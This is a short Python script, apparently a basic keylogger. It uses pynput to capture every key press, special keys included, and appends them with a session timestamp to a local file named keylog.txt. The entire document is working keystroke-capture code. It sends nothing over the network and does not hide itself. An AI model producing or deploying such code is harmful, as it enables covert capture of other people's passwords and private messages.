from pynput import keyboard
import datetime
import os
# --
LOG_FILE = "keylog.txt"
def write_to_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(key)
# --
def clicking(key):
    try:
        write_to_log(key.char)
    except AttributeError:
        special_key = f"[{key}]"
        write_to_log(special_key)
    except:
        write_to_log(f"[UNKNOWN]")
    # --
def main():
    if not os.path.exists(LOG_FILE): 
        open(LOG_FILE, "w").close()
    # --
    with open(LOG_FILE, "a") as f:
        f.write(f"\n** Session started at {datetime.datetime.now()} **\n")
    # --
    with keyboard.Listener(on_press=clicking) as listener:
        listener.join()
# --
if __name__ == "__main__":
    main()